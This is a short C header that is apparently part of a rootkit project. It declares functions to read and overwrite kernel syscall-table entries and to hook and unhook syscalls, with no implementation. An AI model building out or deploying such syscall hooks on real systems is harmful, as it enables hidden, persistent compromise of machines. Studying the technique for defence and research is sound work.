#ifndef ROOTKIT_SYSCALL_HOOKING_H
#define ROOTKIT_SYSCALL_HOOKING_H

#define SYSCALL_INDEX uint16_t

// simply get the addr stored at the syscall table's index
unsigned long get_syscall_func(SYSCALL_INDEX syscall_index, unsigned long *sys_call_table);

// simply set an addr at the syscall table's index
void set_syscall_func(unsigned long func_addr, SYSCALL_INDEX syscall_index, unsigned long *sys_call_table);

// hook handle structure
struct syscall_hook_handle {
    SYSCALL_INDEX syscall_index;
    unsigned long orig_syscall_addr;
    unsigned long hook_func_addr;
};

// hook a syscall specific in the handle and store the original syscall addr in the handle
void hook_syscall(struct syscall_hook_handle* handle, unsigned long *sys_call_table);

// unhook syscall and reset the original syscall addr field in the handle
void unhook_syscall(struct syscall_hook_handle* handle, unsigned long *sys_call_table);

#endif //ROOTKIT_SYSCALL_HOOKING_H
